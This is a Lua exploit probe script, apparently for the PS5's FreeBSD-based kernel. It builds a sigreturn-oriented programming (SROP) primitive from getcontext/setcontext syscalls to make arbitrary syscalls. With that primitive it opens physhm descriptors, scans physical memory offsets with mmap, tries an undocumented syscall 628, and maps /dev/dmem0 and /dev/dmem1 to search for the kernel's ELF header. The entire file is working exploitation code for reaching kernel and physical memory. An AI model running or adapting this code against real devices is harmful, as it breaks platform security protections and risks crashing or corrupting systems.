-- CRASH_CLASS: MODERATE
-- PROBE 152b: Physical memory scan via physhm descriptors
--
-- ng643 PR #89 showed physhm_open(629) returns a descriptor and mmap succeeds
-- but reading faults. However: what if different physical offsets behave
-- differently? If the mmap FAILS at some offsets but SUCCEEDS at others,
-- the pattern of success/failure maps the physical memory layout.
--
-- Also: try mmap with PROT_WRITE only (no read) — if the page is writable
-- but not readable, we can WRITE without faulting, then read it back via
-- a different mapping or via DMA.
--
-- Key insight from ng643: the descriptor obtained via 629(1, 2, 0, mode)
-- where mode is 0-3. Different modes might give different access levels.
--
-- Another angle: use the descriptor with sys 628 (mmap_dmem) which may
-- have a different physical mapping path than regular mmap.

print("=== PROBE 152b: PHYSHM PHYSICAL SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Open physhm with all 4 modes and check differences
print("--- [A] PHYSHM MODE SCAN ---")
local phm_fds = {}
for mode = 0, 3 do
    local fd = srop(629, uint64(1), uint64(2), uint64(0), uint64(mode))
    local fv = fd and to_num(fd) or -1
    phm_fds[mode] = fv
    print("mode=" .. mode .. " fd=" .. fv)
end

-- [B] For each fd, try mmap at many physical offsets
-- Physical memory layout on PS5: ~16GB total
-- Kernel text is typically at low physical addresses
print("")
print("--- [B] PHYSHM MMAP OFFSET SCAN ---")

local best_fd = -1
for mode = 0, 3 do
    if phm_fds[mode] >= 0 then
        best_fd = phm_fds[mode]
        break
    end
end

if best_fd >= 0 then
    -- Scan physical offsets: 0 to 2GB in 16MB steps
    -- mmap success = physical page exists at that offset
    -- mmap fail = no physical page there
    local hits = 0
    for step = 0, 127 do
        local off = step * 0x1000000  -- 16MB steps
        local oh = math.floor(off / 0x100000000)
        local ol = off % 0x100000000
        local off_u = uint64(string.format("0x%X%08X", oh, ol))

        -- Try PROT_READ|PROT_WRITE, MAP_SHARED
        local mp = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(best_fd), off_u)
        local mph, mpl = get_hi_lo(mp)

        if mph ~= 0xFFFFFFFF then
            hits = hits + 1
            print("off=0x" .. string.format("%X", off) .. " MAPPED at 0x" .. string.format("%X%08X", mph, mpl))
            srop(73, mp, uint64(0x4000))  -- munmap immediately, don't read
        end

        -- Also try PROT_WRITE only (no read) — might let us write without fault
        local mp2 = srop(477, uint64(0), uint64(0x4000), uint64(2), uint64(1), uint64(best_fd), off_u)
        local mp2h, mp2l = get_hi_lo(mp2)
        if mp2h ~= 0xFFFFFFFF and (mph == 0xFFFFFFFF) then
            print("off=0x" .. string.format("%X", off) .. " WRITE-ONLY MAPPED!")
            srop(73, mp2, uint64(0x4000))
        elseif mp2h ~= 0xFFFFFFFF then
            srop(73, mp2, uint64(0x4000))
        end
    end
    print("total_mapped=" .. hits)
else
    print("no physhm fd available")
end

-- [C] Try sys 628 mmap_dmem with physhm fd
-- ng643 said it returns -1, but let's try with SROP (full arg control)
print("")
print("--- [C] SYS 628 MMAP_DMEM WITH PHYSHM ---")

if best_fd >= 0 then
    -- 628 recovered shape: (address, length, prot, flags, fd, offset)
    -- Try different arg orders since we're not sure of the exact ABI
    local layouts = {
        {uint64(0), uint64(0x4000), uint64(3), uint64(0x40), uint64(best_fd), uint64(0)},
        {uint64(best_fd), uint64(0x4000), uint64(3), uint64(0), uint64(0), uint64(0)},
        {uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(best_fd), uint64(0)},
    }

    for i, args in ipairs(layouts) do
        local ret = srop(628, args[1], args[2], args[3], args[4], args[5], args[6])
        local rv = ret and to_num(ret) or -999
        local reth, retl = get_hi_lo(ret)
        if reth ~= 0xFFFFFFFF and rv ~= -999 then
            print("layout" .. i .. " ret=0x" .. string.format("%X%08X", reth, retl) .. " ***")
        else
            print("layout" .. i .. " ret=" .. rv)
        end
    end
end

-- [D] Try opening /dev/dmem0 with SROP (O_RDWR) and mmap at kernel-text-like phys addrs
-- The kernel text on FreeBSD/amd64 is typically at physical address matching
-- its virtual address minus KERNBASE (0xFFFFFFFF80000000), so around 0x1000000-0x2000000
print("")
print("--- [D] DMEM0 KERNEL TEXT REGION ---")

-- open("/dev/dmem0", O_RDWR=2)
local devpath = gpu + 0x20000
wd(devpath, 0x7665642F)      -- "/dev"
wd(devpath + 4, 0x656D642F)  -- "/dme"
wd(devpath + 8, 0x0030)      -- "m0\0"
local dm_fd = srop(5, ga(0x20000), uint64(2))
local dmv = dm_fd and to_num(dm_fd) or -1
print("dmem0_fd=" .. dmv)

if dmv >= 0 then
    -- Scan low physical addresses where kernel text could be
    -- FreeBSD kernel typically at phys 0x200000 (2MB) or similar
    local phys_tests = {
        0x0,        -- base
        0x100000,   -- 1MB
        0x200000,   -- 2MB (common kernel load addr)
        0x400000,   -- 4MB
        0x1000000,  -- 16MB
        0x2000000,  -- 32MB
        0x4000000,  -- 64MB
        0x8000000,  -- 128MB
        0x10000000, -- 256MB
        0x20000000, -- 512MB
        0x40000000, -- 1GB
    }

    for _, phys in ipairs(phys_tests) do
        local ph = math.floor(phys / 0x100000000)
        local pl = phys % 0x100000000
        local phys_u = uint64(string.format("0x%X%08X", ph, pl))

        -- mmap(0, 0x4000, PROT_READ, MAP_SHARED, fd, phys_offset)
        local mp = srop(477, uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(dmv), phys_u)
        local mph, mpl = get_hi_lo(mp)

        if mph ~= 0xFFFFFFFF then
            print("phys=0x" .. string.format("%X", phys) .. " MAPPED!")
            -- Try to read first dword
            local ok, val = pcall(function() return memory.read_dword(mp) end)
            if ok then
                local v = to_num(val)
                print("  read=0x" .. string.format("%08X", v))
                -- Check for ELF header or kernel signatures
                if v == 0x464C457F then  -- \x7fELF
                    print("  *** ELF HEADER FOUND AT PHYS 0x" .. string.format("%X", phys) .. " ***")
                end
            else
                print("  read FAULTED")
            end
            srop(73, mp, uint64(0x4000))
        else
            print("phys=0x" .. string.format("%X", phys) .. " fail")
        end
    end
    srop(6, uint64(dmv))
end

-- [E] Try /dev/dmem1 — different GPU partition might map different physical ranges
print("")
print("--- [E] DMEM1 SCAN ---")
wd(devpath + 8, 0x0031)  -- "m1\0"
local dm1_fd = srop(5, ga(0x20000), uint64(2))
local dm1v = dm1_fd and to_num(dm1_fd) or -1
print("dmem1_fd=" .. dm1v)

if dm1v >= 0 then
    for _, phys in ipairs({0x0, 0x100000, 0x200000, 0x1000000, 0x10000000}) do
        local ph = math.floor(phys / 0x100000000)
        local pl = phys % 0x100000000
        local phys_u = uint64(string.format("0x%X%08X", ph, pl))

        local mp = srop(477, uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(dm1v), phys_u)
        local mph, mpl = get_hi_lo(mp)

        if mph ~= 0xFFFFFFFF then
            print("phys=0x" .. string.format("%X", phys) .. " MAPPED!")
            local ok, val = pcall(function() return memory.read_dword(mp) end)
            if ok then
                print("  read=0x" .. string.format("%08X", to_num(val)))
            else
                print("  read FAULTED")
            end
            srop(73, mp, uint64(0x4000))
        else
            print("phys=0x" .. string.format("%X", phys) .. " fail")
        end
    end
    srop(6, uint64(dm1v))
end

-- Cleanup physhm fds
for mode = 0, 3 do
    if phm_fds[mode] >= 0 then
        srop(6, uint64(phm_fds[mode]))
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
